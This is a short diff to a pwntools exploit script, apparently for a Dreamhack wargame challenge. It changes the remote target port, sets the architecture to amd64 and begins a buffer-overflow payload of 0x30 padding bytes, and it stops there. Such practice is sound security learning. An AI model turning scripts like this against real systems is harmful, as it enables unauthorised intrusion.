@@ -1,6 +1,6 @@
 from pwn import *
 
-p = remote('host3.dreamhack.games',15638) # 원격 서버 대상으로 익스플로잇 수행 
+p = remote('host3.dreamhack.games',11521) # 원격 서버 대상으로 익스플로잇 수행 
 context.arch="amd64" # x86-64 
 
 payload = 'A' * 0x30
